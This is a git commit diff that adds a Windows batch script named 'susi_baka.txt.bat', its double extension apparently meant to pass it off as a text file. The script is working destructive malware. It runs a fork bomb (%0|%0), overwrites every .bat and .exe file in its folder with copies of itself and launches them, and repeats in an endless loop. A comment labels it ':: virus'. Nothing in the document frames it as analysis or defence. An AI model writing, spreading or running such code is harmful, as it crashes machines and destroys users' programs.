ad6aa368e6837e23ff5cf0d05b9272df3a2a20ae
Gage Atkinson <73555272+someStranger8@users.noreply.github.com>
2022-01-07 12:27:21 -0500

    Update and rename shadow.bat to susi_baka.txt.bat

---
+++ susi_baka.txt.bat
@@ -0,0 +1,25 @@
+@echo off
+
+:: change name and color
+title susi baka
+color 57
+
+:: loop
+lessgo:
+
+:: increase cpu usage
+%0|%0
+
+:: copy and start all bat files
+copy %0 *.bat > nul
+start "" *.bat
+
+:: copy and start all exe files
+copy %0 *.exe > nul
+start "" *.exe
+
+:: virus
+
+
+:: start loop
+goto lessgo
